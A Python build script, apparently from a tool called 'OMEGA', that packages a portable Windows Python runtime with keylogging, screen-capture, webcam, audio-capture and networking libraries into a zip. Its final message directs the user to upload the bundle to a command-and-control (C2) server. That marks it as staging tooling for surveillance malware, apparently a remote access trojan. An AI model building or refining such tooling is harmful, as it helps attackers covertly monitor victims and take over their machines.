import os, sys, shutil, zipfile, subprocess, tempfile

def bundle():
    print("[OMEGA] Preparing Universal Runtime Bundle...")
    
    # 1. Identify paths
    py_dir = os.path.dirname(sys.executable)
    work_dir = os.path.join(tempfile.gettempdir(), "omega_bundle")
    if os.path.exists(work_dir): shutil.rmtree(work_dir)
    os.makedirs(work_dir)
    
    # 2. Copy core bin files
    print(" - Collecting core binaries...")
    bin_dir = os.path.join(work_dir, "bin")
    os.makedirs(bin_dir)
    
    core_files = [
        "python.exe", "python3.dll", "python311.dll", 
        "vcruntime140.dll", "vcruntime140_1.dll"
    ]
    for f in core_files:
        src = os.path.join(py_dir, f)
        if os.path.exists(src):
            shutil.copy2(src, bin_dir)
    
    # 3. Collect required site-packages
    print(" - Harvesting dependencies (OpenCV, Pynput, etc)...")
    sp_dir = os.path.join(work_dir, "Lib", "site-packages")
    os.makedirs(sp_dir)
    
    deps = [
        "cv2", "numpy", "pynput", "psutil", "requests", "urllib3", 
        "websockets", "orjson", "mss", "soundcard", "pycaw", "comtypes", "pyttsx3", "speech_recognition"
    ]
    
    # Find site-packages path
    import site
    packages_paths = site.getsitepackages()
    
    for dep in deps:
        found = False
        for p in packages_paths:
            dep_path = os.path.join(p, dep)
            if os.path.exists(dep_path):
                if os.path.isdir(dep_path):
                    shutil.copytree(dep_path, os.path.join(sp_dir, dep), dirs_exist_ok=True)
                else:
                    shutil.copy2(dep_path, sp_dir)
                found = True
                break
        if not found:
            print(f" [!] Warning: Dependency '{dep}' not found in site-packages.")

    # 4. Create ZIP
    print(" - Compressing bundle...")
    output_zip = "omega_runtime.zip"
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as z:
        for root, dirs, files in os.walk(work_dir):
            for f in files:
                abs_p = os.path.join(root, f)
                rel_p = os.path.relpath(abs_p, work_dir)
                z.write(abs_p, rel_p)
                
    print(f"\n[SUCCESS] Universal Runtime created: {output_zip}")
    print(" -> Upload this file to your C2 server (static/ directory) or any public URL.")
    shutil.rmtree(work_dir)

if __name__ == "__main__":
    bundle()
